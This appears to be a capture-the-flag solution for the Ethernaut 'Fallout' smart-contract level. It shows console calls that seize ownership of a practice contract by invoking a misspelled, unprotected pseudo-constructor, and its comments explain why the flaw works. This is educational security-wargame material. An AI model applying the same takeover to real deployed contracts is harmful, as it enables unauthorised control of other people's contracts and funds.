// TODO: Claim ownership of the contract

/**
 * Level address 0x220beee334f1c1f8078352d88bcc4e6165b792f6
 * Player address 0x300ba264268b13f3dbadb27426632508bcad2a2d
 * Ethernaut address 0xc833a73d33071725143d7cf7dfd4f4bba6b5ced2
 * Instance address 0x22ff88fe2c6aa811ba300ccc02fbac1f5cb8d443
 */

contract.owner()
// ^ returns promise with address 0x220beee334f1c1f8078352d88bcc4e6165b792f6

contract.Fal1out()
// ^ Notice the misspelling of the method, in the contract, because of that
// the method is not considered by the compiler to be the constructor 
// of the contract (the 2 names don't match). Thus anyone can call this method

contract.owner()
// ^ returns promise with address of new owner
// 0x300ba264268b13f3dbadb27426632508bcad2a2d